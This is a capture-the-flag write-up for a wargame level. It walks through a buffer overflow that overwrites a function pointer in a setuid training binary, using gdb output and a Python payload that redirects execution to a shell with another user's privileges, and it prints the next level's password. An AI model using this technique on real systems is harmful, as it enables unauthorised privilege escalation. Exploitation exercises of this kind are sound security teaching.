# Level16

## This level's goal
- Function pointer modulation

***

```
[level16@ftz level16]$ ls -l
-rwsr-x---    1 level17  level16     14017 Mar  8  2003 attackme
-rw-r-----    1 root     level16       235 Mar  8  2003 hint

[level16@ftz level16]$ cat hint

#include <stdio.h>

void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}

void printit() {
  printf("Hello there!\n");
}

main()
{ 
  int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```

```
[level16@ftz tmp]$ cat distance.c
#include <stdio.h>

void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}

void printit() {
  printf("Hello there!\n");
}

main()
{
  int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();

  printf("Input is : %s\n &buf  : %p\n &call : %p \n &crap : %p\n", buf, buf, &call, &crap);
}

[level16@ftz tmp]$ gcc distance.c -o distance
[level16@ftz tmp]$ gdb -q distance
(gdb) disass main
0x08048434 <main+3>:    sub    $0x38,%esp

[level16@ftz tmp]$ ./distance
AAAA
Hello there!
Input is : AAAA

&buf  : 0xbffff020
&call : 0xbffff048
&crap : 0xbffff04c
```

0x38 means 56bytes, buf(20bytes) + dummy(20bytes) + \*printit(4bytes,0xbffff048) + crap(4bytes,0xbffff04c) + dummy(8bytes) + SPF(4bytes) + RET(4bytes).

```
[level16@ftz tmp]$ gdb -q distance
(gdb) disass main
0x08048462 <main+49>:   call   *%eax

(gdb) break *0x08048462
(gdb) run
Starting program: /home/level16/tmp/distance
AAAA

(gdb) x/16x $esp
0xbfffe1b0:     0x41414141      0x0000000a      0x42015481      0x0804836a
0xbfffe1c0:     0x42130ef8      0x42130a14      0xbfffe1d8      0x080482d9
0xbfffe1d0:     0x42130a14      0x4000c660      0x08048419      0x08048492
0xbfffe1e0:     0x42130a14      0x40015360      0xbfffe208      0x42015574

(gdb) x/s 0xbfffe1b0
0xbfffe1b0:      "AAAA\n"

(gdb) x/x 0xbfffe1d8
0xbfffe1d8:     0x08048419

(gdb) x/x 0xbfffe1dc
0xbfffe1dc:     0x08048492

(gdb) x/x 0x08048419
0x8048419 <printit>:    0x83e58955

(gdb) disas printit
0x08048419 <printit+0>: push   %ebp
```

As above, I could see that the \*printit(0x08048419)'s address is printit(0x83e58955).

```
[level16@ftz level16]$ gdb -q attackme
(gdb) disass main
0x0804853f <main+39>:   call   *%eax

(gdb) x/x 0x0804853f
0x804853f <main+39>:    0xc3c9d0ff

(gdb) disass printit
0x08048500 <printit+0>: push   %ebp

(gdb) disass shell
0x080484d0 <shell+0>:   push   %ebp

```

The point is that you need to change \*printit()'s address to shell()'s adress.

The attack code will be 40 bytes dummy strings + shell()'s adress(0x080484d0).

```
[level16@ftz level16]$ (python -c 'print "A"*40+"\xd0\x84\x04\x08"'; cat) | ./attackme

id
uid=3097(level17) gid=3096(level16) groups=3096(level16)

my-pass
Level17 Password is "king poetic".
```


